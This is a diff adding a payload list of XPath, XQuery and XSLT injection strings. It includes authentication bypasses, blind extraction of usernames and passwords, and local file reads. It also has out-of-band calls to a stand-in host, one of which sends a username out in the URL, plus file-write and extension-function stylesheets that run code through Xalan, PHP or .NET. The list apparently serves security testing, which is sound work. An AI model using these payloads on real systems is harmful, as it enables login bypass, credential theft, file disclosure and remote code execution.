@@ -1,0 +1,114 @@
+# XPath and XSLT Injection Payloads
+
+# XPath: error and detection probes
+"
+'"
+]
+)
+' or '
+" or "
+'] | //*[
+'or''='
+
+# XPath: authentication bypass
+" or "1"="1
+" or 1=1 or ""="
+admin' or 1=1 or ''='
+' or true() or '
+' or position()=1 or '
+' or name()='user' or '
+x' or count(/*)>0 or 'x'='y
+') or 1=1 or ('x'='y
+' or contains(name(),'user') or '
+admin']/../*[1]|//*[' 
+' or /* or '
+
+# XPath: boolean-based blind (compare the response of the true case against the false case)
+' and '1'='1
+' and '1'='2
+' or substring(name(/*[1]),1,1)='a' or '
+' and string-length(name(/*[1]))>3 and '1'='1
+' and count(/*)=1 and '1'='1
+' and count(/*/*)>0 and '1'='1
+' and substring(//user[1]/username,1,1)='a' and '1'='1
+' and string-length(//user[1]/password)>0 and '1'='1
+' and starts-with(//user[1]/username,'a') and '1'='1
+' and contains(//user[1]/username,'a') and '1'='1
+' and string-to-codepoints(substring(//user[1]/username,1,1))=97 and '1'='1
+' and name(/*[1])='users' and '1'='1
+' and name(/*[1]/*[1])='user' and '1'='1
+
+# XPath: schema and node discovery (metadata first)
+//*
+/*
+/*[1]
+/*[1]/*[1]
+//user
+//user/*
+//user[1]/username
+//user[1]/password
+//@*
+//text()
+count(//*)
+name(/*[1])
+string-length(name(/*[1]))
+position()
+last()
+
+# XPath: union-style extraction
+' | //user/password | '
+' | //*[1] | '
+x' | //password | //nothing['
+'] | //user/* | //x['
+
+# XPath: out-of-band (XPath 2.0 / vendor functions that fetch a URL)
+' or doc('http://oast.example.test/xpath-oob')/x or '
+' or doc(concat('http://oast.example.test/',//user[1]/username)) or '
+doc('http://oast.example.test/xpath-oob')
+unparsed-text('http://oast.example.test/xpath-oob')
+
+# XQuery injection
+for $x in doc('users.xml')//user return $x
+doc('file:///etc/hostname')
+unparsed-text('file:///etc/hostname')
+fn:doc('http://oast.example.test/xquery-oob')
+fn:unparsed-text('file:///etc/hostname')
+
+# XSLT: processor identification (stylesheet body or an injected value-of)
+<xsl:value-of select="system-property('xsl:vendor-url')"/>
+<xsl:value-of select="system-property('xsl:version')"/>
+<xsl:value-of select="system-property('xsl:product-name')"/>
+<xsl:value-of select="system-property('xsl:product-version')"/>
+
+# XSLT: full stylesheet for processor detection
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:output method="text"/><xsl:template match="/"><xsl:value-of select="system-property('xsl:vendor')"/>|<xsl:value-of select="system-property('xsl:version')"/></xsl:template></xsl:stylesheet>
+
+# XSLT: local file read (document, unparsed-text, entity)
+<xsl:value-of select="document('file:///etc/hostname')"/>
+<xsl:value-of select="unparsed-text('file:///etc/hostname')"/>
+<xsl:copy-of select="document('/etc/hostname')"/>
+<xsl:value-of select="unparsed-text('file:///C:/Windows/win.ini')"/>
+<xsl:value-of select="document('')"/>
+
+# XSLT: SSRF and out-of-band
+<xsl:copy-of select="document('http://oast.example.test/xslt-oob')"/>
+<xsl:value-of select="unparsed-text('http://oast.example.test/xslt-oob')"/>
+<xsl:include href="http://oast.example.test/xslt-include.xsl"/>
+<xsl:import href="http://oast.example.test/xslt-import.xsl"/>
+
+# XSLT: write a file (XSLT 2.0 / Saxon, Xalan redirect extension) to prove write capability with an inert marker
+<xsl:result-document href="file:///tmp/xslt-write-marker.txt"><xsl:text>xslt-marker</xsl:text></xsl:result-document>
+
+# XSLT: extension-function execution probes (Xalan-J / Saxon / PHP / .NET). Confirm only that an extension namespace is honoured.
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object" xmlns:sys="http://xml.apache.org/xalan/java/java.lang.System"><xsl:template match="/"><xsl:value-of select="sys:getProperty('os.name')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('phpversion')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:u="urn:ext"><msxsl:script language="C#" implements-prefix="u">public string v(){return System.Environment.OSVersion.ToString();}</msxsl:script><xsl:template match="/"><xsl:value-of select="u:v()"/></xsl:template></xsl:stylesheet>
+<xsl:value-of select="php:function('file_get_contents','/etc/hostname')" xmlns:php="http://php.net/xsl"/>
+
+# XSLT: client-side stylesheet reference (xml-stylesheet processing instruction)
+<?xml-stylesheet type="text/xsl" href="http://oast.example.test/style.xsl"?>
+<?xml-stylesheet type="text/xsl" href="data:text/xml,%3Cxsl%3Astylesheet%20version%3D%221.0%22%20xmlns%3Axsl%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%3E%3Cxsl%3Atemplate%20match%3D%22%2F%22%3Exslt-marker%3C%2Fxsl%3Atemplate%3E%3C%2Fxsl%3Astylesheet%3E"?>
+
+# XSLT: injection into an XSL attribute value (select / test / match) rather than whole stylesheet
+' or document('http://oast.example.test/xslt-attr') or '
+'] | document('file:///etc/hostname') | //x['
